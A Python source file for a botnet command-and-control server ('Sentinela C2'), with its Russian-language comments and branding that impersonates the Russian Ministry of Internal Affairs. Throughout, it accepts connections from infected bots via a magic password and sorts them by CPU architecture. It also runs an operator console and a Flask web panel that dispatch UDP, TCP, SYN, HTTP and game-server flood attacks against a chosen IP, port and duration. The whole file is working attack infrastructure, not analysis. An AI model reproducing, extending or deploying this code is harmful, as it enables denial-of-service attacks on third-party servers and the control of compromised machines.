import ipaddress, time, sys, threading, socket, logging, os
from colorama import Fore, init
from flask import Flask, render_template, request, jsonify, send_file, session, redirect, url_for

# --- НАСТРОЙКИ ---
WEB_PORT = 8080
WEB_USERNAME = "web_admin"
BG_IMAGE_FILE = "123.jpg"  # Фон для веб-панели

app = Flask(__name__)
app.secret_key = 'sentinela_web_secret_2025'  # Обязательно для сессий
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# --- BACKEND LOGIC ---

clients = {}
attacks = {}
bots = {}
bots_by_arch = {
    "mips": [], "i386": [], "x86_64": [], "armv7l": [],
    "armv8l": [], "aarch64": [], "unknown": []
}
threads = 5
ansi_clear = '\033[2J\033[H'
banner = "МИНИСТЕРСТВО ВНУТРЕННИХ ДЕЛ РОССИЙСКОЙ ФЕДЕРАЦИИ"

def botnetMethodsName(method):
    method_name = {
        ".UDP": 'UDP Flood Bypass', ".TCP": 'TCP Flood Bypass',
        ".OVHUDP": 'OVH UDP Flood', ".OVHTCP": 'OVH TCP Flood',
        ".MIX": 'TCP/UDP Mix', ".SYN": 'TCP SYN Flood',
        ".HEX": 'HEX Flood', ".VSE": 'Valve Source Engine',
        ".MCPE": 'Minecraft PE Ping', ".FIVEM": 'FiveM Ping',
        ".HTTPGET": 'HTTP GET Flood', ".HTTPPOST": 'HTTP POST Flood',
        ".BROWSER": 'Browser Simulator'
    }
    return method_name if method == 'ALL' else method_name.get(method, "")

def isBotnetMethod(m): return botnetMethodsName(m) != ""

def remove_bot_by_address(address):
    for arch in bots_by_arch:
        for bot in bots_by_arch[arch]:
            if bot[0] == address:
                try:
                    bot[0].close()
                except:
                    pass
                bots_by_arch[arch].remove(bot)
                return

def removeAttacks(username, timeout):
    time.sleep(timeout)
    if username in attacks:
        del attacks[username]

def checkUserAttack(user): return user not in attacks

def TargetIsAlreadySent(target, user):
    for u, info in attacks.items():
        if info['target'] == target:
            return False
    return True

def validate_ip(ip):
    try:
        parts = ip.split('.')
        return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts)
    except:
        return False

def validate_port(p): return str(p).isdigit() and 1 <= int(p) <= 65535
def validate_time(t): return str(t).isdigit() and 10 <= int(t) <= 1300

def check_Blacklisted_Target(target):
    try:
        with open('blacklist.txt', 'r') as f:
            return target in {x.strip() for x in f if x.strip()}
    except:
        return False

def find_login(user, pwd):
    """Проверяет логин:пароль по файлу logins.txt"""
    try:
        with open('logins.txt', 'r') as f:
            for line in f:
                line = line.strip()
                if not line or ':' not in line:
                    continue
                u, p = line.split(':', 1)
                if u == user and p == pwd:
                    return True
    except FileNotFoundError:
        # Если файла нет — доступ запрещён
        return False
    return False

def send(sock, data, escape=True, reset=True):
    if escape:
        data += '\r\n'
    try:
        sock.send(data.encode())
    except:
        pass

def broadcast(data, user):
    dead = []
    for bot in list(bots.keys()):
        try:
            send(bot, f'{data} {threads} {user}', False, False)
        except:
            dead.append(bot)
    for b in dead:
        try:
            bots.pop(b)
            b.close()
        except:
            pass

def ping():
    while True:
        dead = []
        for bot in list(bots.keys()):
            try:
                bot.settimeout(5)
                send(bot, 'PING', False, False)
                if bot.recv(1024).decode() != 'PONG':
                    dead.append(bot)
            except:
                dead.append(bot)
        for b in dead:
            try:
                bots.pop(b)
                b.close()
                remove_bot_by_address(b)
            except:
                pass
        time.sleep(15)

def update_title(client, name):
    while True:
        try:
            send(client, f"\33]0;Sentinela | Bots: {len(bots)} \a", False)
            time.sleep(2)
        except:
            break

def handle_client(client, addr):
    try:
        send(client, f'\33]0;Login\a', False)
        send(client, 'Username: ', False)
        u = client.recv(1024).decode().strip()
        send(client, 'Password: ', False)
        p = client.recv(1024).decode('cp1252').strip()

        if p != '\xff\xff\xff\xff\75':
            if not find_login(u, p):
                client.close()
                return
            send(client, ansi_clear + banner + '\nType HELP\n$ ', False)
            threading.Thread(target=update_title, args=(client, u), daemon=True).start()
            while True:
                data = client.recv(1024).decode().strip()
                if not data:
                    continue
                args = data.split(' ')
                cmd = args[0].upper()
                if cmd == 'STOP':
                    if u in attacks:
                        del attacks[u]
                    broadcast('STOP', u)
                    send(client, 'Stopped.\n$ ', False)
                elif isBotnetMethod(cmd) and len(args) == 4:
                    broadcast(data, u)
                    send(client, 'Sent.\n$ ', False)
                else:
                    send(client, 'Unknown or Bad Args\n$ ', False)
        else:
            bot_arch = u if u in bots_by_arch else 'unknown'
            bots[client] = addr
            bots_by_arch[bot_arch].append((client, addr))
    except:
        try:
            client.close()
        except:
            pass

# --- FLASK ROUTES ---

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        username = request.form['username'].strip()
        password = request.form['password'].strip()
        if find_login(username, password):
            session['logged_in'] = True
            session['username'] = username
            return redirect(url_for('index'))
        else:
            error = "Invalid username or password"
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <title>МИНИСТЕРСТВО ВНУТРЕННИХ ДЕЛ РОССИЙСКОЙ ФЕДЕРАЦИИ</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <style>
            body {{ background: #0f0f0f; }}
            .glass {{
                background: rgba(15, 15, 15, 0.6);
                backdrop-filter: blur(15px);
                border: 1px solid rgba(255,255,255,0.1);
                box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            }}
        </style>
    </head>
    <body class="min-h-screen flex items-center justify-center text-white">
        <div class="glass rounded-2xl p-8 w-full max-w-md">
            <h2 class="text-2xl font-bold text-center mb-6">Sentinela C2 Login</h2>
            {f'<div class="text-red-400 text-center mb-4">{error}</div>' if error else ''}
            <form method="post">
                <div class="mb-4">
                    <label class="block text-sm mb-2">Username</label>
                    <input type="text" name="username" class="w-full bg-black/30 border border-white/10 rounded px-4 py-2 text-white" required>
                </div>
                <div class="mb-6">
                    <label class="block text-sm mb-2">Password</label>
                    <input type="password" name="password" class="w-full bg-black/30 border border-white/10 rounded px-4 py-2 text-white" required>
                </div>
                <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 py-2 rounded font-medium">Sign In</button>
            </form>
        </div>
    </body>
    </html>
    '''

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/')
def index():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    return render_template('index.html', methods=botnetMethodsName('ALL'), bots=len(bots), attacks=len(attacks))

@app.route('/bg.jpg')
def bg_img():
    if os.path.exists(BG_IMAGE_FILE):
        return send_file(BG_IMAGE_FILE, mimetype='image/jpeg')
    return "", 404

@app.route('/api/stats')
def stats():
    return jsonify({"bots": len(bots), "attacks": len(attacks)})

@app.route('/api/stop', methods=['POST'])
def stop():
    if WEB_USERNAME in attacks:
        del attacks[WEB_USERNAME]
    broadcast("STOP", WEB_USERNAME)
    return jsonify({"status": "stopped"})

@app.route('/api/attack', methods=['POST'])
def attack():
    d = request.json
    m, ip, p, t = d.get('method'), d.get('ip'), d.get('port'), d.get('time')

    if not all([m, ip, p, t]):
        return jsonify({"error": "Missing fields"}), 400
    if not isBotnetMethod(m):
        return jsonify({"error": "Bad Method"}), 400
    if check_Blacklisted_Target(ip):
        return jsonify({"error": "Blacklisted"}), 400
    if not validate_ip(ip):
        return jsonify({"error": "Bad IP"}), 400
    if not validate_port(p):
        return jsonify({"error": "Bad Port"}), 400
    if not validate_time(t):
        return jsonify({"error": "Bad Time"}), 400
    if not checkUserAttack(WEB_USERNAME):
        return jsonify({"error": "Busy"}), 400
    if not TargetIsAlreadySent(ip, WEB_USERNAME):
        return jsonify({"error": "Target Busy"}), 400

    broadcast(f"{m} {ip} {p} {t}", WEB_USERNAME)
    attacks[WEB_USERNAME] = {'target': ip, 'duration': t}
    threading.Thread(target=removeAttacks, args=(WEB_USERNAME, int(t)), daemon=True).start()
    return jsonify({"status": "sent"})

def main():
    if len(sys.argv) != 2:
        exit(f'Usage: python {sys.argv[0]} <PORT>')
    port = int(sys.argv[1])
    init(convert=True)

    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', port))
    sock.listen()
    print(f"Botnet listening on port: {port}")
    print(f"Web panel: http://0.0.0.0:{WEB_PORT}/ (login via logins.txt)")

    threading.Thread(target=lambda: app.run('0.0.0.0', WEB_PORT, debug=False, use_reloader=False), daemon=True).start()
    threading.Thread(target=ping, daemon=True).start()

    while True:
        try:
            c, a = sock.accept()
            threading.Thread(target=handle_client, args=(c, a), daemon=True).start()
        except:
            pass

if __name__ == '__main__':
    main()